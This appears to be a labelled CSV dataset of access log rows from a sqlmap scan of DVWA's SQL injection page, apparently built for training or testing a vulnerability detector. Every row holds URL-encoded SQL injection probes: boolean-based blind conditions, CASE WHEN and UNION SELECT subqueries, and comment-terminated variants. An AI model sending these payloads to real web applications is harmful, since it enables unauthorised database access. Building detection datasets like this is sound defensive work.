ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%29%20AND%207379%3D4997%20AND%20%284642%3D4642&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%29%20AND%207379%3D4997%20AND%20%284642%3D4642&Submit=Submit,HTTP/1.1,106,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%29%20AND%206580%3D6580%20AND%20%289000%3D9000&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%29%20AND%206580%3D6580%20AND%20%289000%3D9000&Submit=Submit,HTTP/1.1,106,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%20AND%205951%3D8992&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%20AND%205951%3D8992&Submit=Submit,HTTP/1.1,80,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%20AND%206580%3D6580&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%20AND%206580%3D6580&Submit=Submit,HTTP/1.1,80,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%20AND%204225%3D4419--%20TYDS&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%20AND%204225%3D4419--%20TYDS&Submit=Submit,HTTP/1.1,89,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%20AND%206580%3D6580--%20EHDd&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%20AND%206580%3D6580--%20EHDd&Submit=Submit,HTTP/1.1,89,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=%28SELECT%20%28CASE%20WHEN%20%281800%3D5216%29%20THEN%200x6964%20ELSE%20%28SELECT%205216%20UNION%20SELECT%201356%29%20END%29%29&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=%28SELECT%20%28CASE%20WHEN%20%281800%3D5216%29%20THEN%200x6964%20ELSE%20%28SELECT%205216%20UNION%20SELECT%201356%29%20END%29%29&Submit=Submit,HTTP/1.1,185,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=%28SELECT%20%28CASE%20WHEN%20%281156%3D1156%29%20THEN%200x6964%20ELSE%20%28SELECT%202926%20UNION%20SELECT%204941%29%20END%29%29&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=%28SELECT%20%28CASE%20WHEN%20%281156%3D1156%29%20THEN%200x6964%20ELSE%20%28SELECT%202926%20UNION%20SELECT%204941%29%20END%29%29&Submit=Submit,HTTP/1.1,185,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=%28SELECT%20CONCAT%28CONCAT%280x71766b7871%2C%28CASE%20WHEN%20%285309%3D5309%29%20THEN%200x31%20ELSE%200x30%20END%29%29%2C0x716a707171%29%29&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=%28SELECT%20CONCAT%28CONCAT%280x71766b7871%2C%28CASE%20WHEN%20%285309%3D5309%29%20THEN%200x31%20ELSE%200x30%20END%29%29%2C0x716a707171%29%29&Submit=Submit,HTTP/1.1,198,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%29%20AND%204826%3D1660%23&Submit=Submit HTTP/1.1,200,657,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%29%20AND%204826%3D1660%23&Submit=Submit,HTTP/1.1,89,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%29%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,654,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%29%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,89,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%206980%3D8520%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%206980%3D8520%23&Submit=Submit,HTTP/1.1,86,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,86,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%22%20AND%204550%3D3615%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%22%20AND%204550%3D3615%23&Submit=Submit,HTTP/1.1,86,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%22%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%22%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,86,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%29%29%20AND%207952%3D5268%23&Submit=Submit HTTP/1.1,200,659,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%29%29%20AND%207952%3D5268%23&Submit=Submit,HTTP/1.1,92,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%29%29%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,654,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%29%29%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,92,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%29%29%29%20AND%209215%3D4291%23&Submit=Submit HTTP/1.1,200,657,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%29%29%29%20AND%209215%3D4291%23&Submit=Submit,HTTP/1.1,95,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%29%29%29%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,655,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%29%29%29%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,95,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%25%27%20AND%205809%3D4109%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%25%27%20AND%205809%3D4109%23&Submit=Submit,HTTP/1.1,89,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%25%27%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%25%27%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,89,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%22%29%20AND%201882%3D3359%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%22%29%20AND%201882%3D3359%23&Submit=Submit,HTTP/1.1,89,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%22%29%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%22%29%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,89,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%22%29%29%20AND%203654%3D3660%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%22%29%29%20AND%203654%3D3660%23&Submit=Submit,HTTP/1.1,92,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%22%29%29%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%22%29%29%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,92,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%22%29%29%29%20AND%205264%3D6279%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%22%29%29%29%20AND%205264%3D6279%23&Submit=Submit,HTTP/1.1,95,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%22%29%29%29%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%22%29%29%29%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,95,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%29%29%20AS%20uVYu%20WHERE%208460%3D8460%20AND%206572%3D8572%23&Submit=Submit HTTP/1.1,200,676,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%29%29%20AS%20uVYu%20WHERE%208460%3D8460%20AND%206572%3D8572%23&Submit=Submit,HTTP/1.1,126,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%29%29%20AS%20ANad%20WHERE%204693%3D4693%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,674,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%29%29%20AS%20ANad%20WHERE%204693%3D4693%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,126,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%22%29%29%20AS%20ofjU%20WHERE%201138%3D1138%20AND%209866%3D1335%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%22%29%29%20AS%20ofjU%20WHERE%201138%3D1138%20AND%209866%3D1335%23&Submit=Submit,HTTP/1.1,126,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%22%29%29%20AS%20xtgC%20WHERE%201413%3D1413%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%22%29%29%20AS%20xtgC%20WHERE%201413%3D1413%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,126,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%29%20AS%20ceKy%20WHERE%205091%3D5091%20AND%206775%3D3701%23&Submit=Submit HTTP/1.1,200,676,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%29%20AS%20ceKy%20WHERE%205091%3D5091%20AND%206775%3D3701%23&Submit=Submit,HTTP/1.1,123,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%29%20AS%20OJSl%20WHERE%202630%3D2630%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,675,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%29%20AS%20OJSl%20WHERE%202630%3D2630%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,123,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%22%29%20AS%20uPWZ%20WHERE%207023%3D7023%20AND%208979%3D8599%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%22%29%20AS%20uPWZ%20WHERE%207023%3D7023%20AND%208979%3D8599%23&Submit=Submit,HTTP/1.1,123,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%22%29%20AS%20ToVu%20WHERE%204589%3D4589%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%22%29%20AS%20ToVu%20WHERE%204589%3D4589%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,123,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20IN%20BOOLEAN%20MODE%29%20AND%208593%3D6795%23&Submit=Submit HTTP/1.1,200,670,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20IN%20BOOLEAN%20MODE%29%20AND%208593%3D6795%23&Submit=Submit,HTTP/1.1,111,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%27%20IN%20BOOLEAN%20MODE%29%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,666,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%27%20IN%20BOOLEAN%20MODE%29%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,111,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%29%20AND%201640%3D9657%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%29%20AND%201640%3D9657%23&Submit=Submit,HTTP/1.1,86,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%29%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%29%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,86,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%29%29%20AND%207858%3D3238%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%29%29%20AND%207858%3D3238%23&Submit=Submit,HTTP/1.1,89,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%29%29%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%29%29%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,89,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%29%29%29%20AND%203627%3D3948%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%29%29%29%20AND%203627%3D3948%23&Submit=Submit,HTTP/1.1,92,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%29%29%29%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%29%29%29%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,92,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%20AND%205528%3D3352%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%20AND%205528%3D3352%23&Submit=Submit,HTTP/1.1,83,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,83,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%29%29%20AS%20MfIA%20WHERE%202401%3D2401%20AND%204159%3D9380%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%29%29%20AS%20MfIA%20WHERE%202401%3D2401%20AND%204159%3D9380%23&Submit=Submit,HTTP/1.1,123,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%29%29%20AS%20aycz%20WHERE%208672%3D8672%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%29%29%20AS%20aycz%20WHERE%208672%3D8672%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,123,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%29%20AS%20YseE%20WHERE%206740%3D6740%20AND%209786%3D3919%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%29%20AS%20YseE%20WHERE%206740%3D6740%20AND%209786%3D3919%23&Submit=Submit,HTTP/1.1,120,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%29%20AS%20FsSp%20WHERE%206370%3D6370%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%29%20AS%20FsSp%20WHERE%206370%3D6370%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,120,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%60%20WHERE%201353%3D1353%20AND%208383%3D9095%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%60%20WHERE%201353%3D1353%20AND%208383%3D9095%23&Submit=Submit,HTTP/1.1,108,5,40,SQLi
12.12.12.12,-,-,2024-06-30 14:40:16-04:00,GET /DVWA/vulnerabilities/sqli/?id=id%60%20WHERE%202379%3D2379%20AND%204045%3D4045%23&Submit=Submit HTTP/1.1,200,1639,-,sqlmap/1.8.6.17#dev (https://sqlmap.org),SQLi,GET,/DVWA/vulnerabilities/sqli/?id=id%60%20WHERE%202379%3D2379%20AND%204045%3D4045%23&Submit=Submit,HTTP/1.1,108,5,40,SQLi
